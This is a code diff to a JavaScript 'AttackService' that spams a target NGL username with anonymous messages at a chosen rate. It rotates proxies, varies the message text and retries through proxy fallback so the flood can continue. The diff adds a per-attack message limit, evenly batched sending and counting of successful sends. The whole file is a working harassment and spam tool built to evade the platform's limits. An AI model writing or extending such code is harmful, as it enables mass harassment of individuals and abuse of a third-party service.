@@ -32,7 +32,7 @@ export const AttackService = {
         }
     },
 
-    async startSpam(username, messages, rps, duration, userId, userTag) {
+    async startSpam(username, messages, rps, duration, userId, userTag, channelId = null, messageLimit = null) {
         // Check proxies
         if (ProxyService.proxies.length === 0) {
              console.warn('⚠️ No proxies loaded. Running in direct mode (Risky).');
@@ -79,13 +79,15 @@ export const AttackService = {
             paused: false,
             pauseStartTime: 0,
             totalPausedTime: 0,
-            active: true
+            active: true,
+            messageLimit: messageLimit || null, // null = unlimited
+            sentCount: 0                        // track successful sends
         };
 
         this.activeAttacks.set(username, attackState);
 
         // Start Attack Loop
-        this._startAttackLoop(username, messages, rps);
+        this._startAttackLoop(username, messages, rps, messageLimit);
 
         // Auto-stop timer
         setTimeout(async () => {
@@ -97,24 +99,39 @@ export const AttackService = {
         return { success: true };
     },
 
-    _startAttackLoop(username, messages, rps) {
-        const intervalMs = 1000 / rps;
-        const batchSize = rps > 20 ? Math.ceil(rps / 10) : 1;
-        const baseDelay = rps > 20 ? Math.max(10, (intervalMs * batchSize)) : intervalMs;
-        const jitter = baseDelay * 0.3;
+    _startAttackLoop(username, messages, rps, messageLimit = null) {
+        // Fire messages smoothly distributed over time to honor the Requests Per Second limit
+        const intervalMs = 100;
+        // e.g. 50 RPS => 5 requests every 100ms to avoid overwhelming network Sockets
+        const batchSize = Math.max(1, Math.floor(rps / 10));
+
+        let msgIndex = 0;
 
         const attackLoop = async () => {
             if (!this.activeAttacks.has(username)) return;
             const state = this.activeAttacks.get(username);
-            if (state.paused) return; // Don't loop if paused (resume will restart)
+            if (state.paused) return; 
 
             for (let i = 0; i < batchSize; i++) {
-                const rawMsg = messages[Math.floor(Math.random() * messages.length)];
+                if (!this.activeAttacks.has(username)) return; 
+
+                const currentState = this.activeAttacks.get(username);
+                if (messageLimit && currentState.sentCount >= messageLimit) {
+                    console.log(`✅ Message limit (${messageLimit}) reached for ${username}. Stopping.`);
+                    this.stopAttack(username, currentState.userId, currentState.userTag, true);
+                    return;
+                }
+
+                const rawMsg = messages[msgIndex % messages.length];
+                msgIndex++;
                 const msg = this.variateMessage(rawMsg);
 
-                NGLService.sendMessage(username, msg)
+                NGLService.sendMessageWithProxyFallback(username, msg)
                     .then(result => {
-                        if (this.activeAttacks.has(username) && !this.activeAttacks.get(username).paused) {
+                        if (!this.activeAttacks.has(username)) return;
+                        const s = this.activeAttacks.get(username);
+                        if (!s.paused) {
+                            if (result.success) s.sentCount++;
                             this.recordStat(username, result.success, rawMsg, result);
                         }
                     })
@@ -125,10 +142,8 @@ export const AttackService = {
                     });
             }
 
-            const randomDelay = Math.max(10, baseDelay + (Math.random() * jitter) - (jitter / 2));
-
             if (this.activeAttacks.has(username) && !this.activeAttacks.get(username).paused) {
-                state.timeoutId = setTimeout(attackLoop, randomDelay);
+                state.timeoutId = setTimeout(attackLoop, intervalMs);
             }
         };
 
@@ -188,7 +203,7 @@ export const AttackService = {
                 state.endTime += pauseDuration;
 
                 // Restart loop
-                this._startAttackLoop(username, state.messages, state.rps);
+                this._startAttackLoop(username, state.messages, state.rps, state.messageLimit);
 
                 // Re-arm auto-stop timer
                 const remainingTime = state.endTime - Date.now();
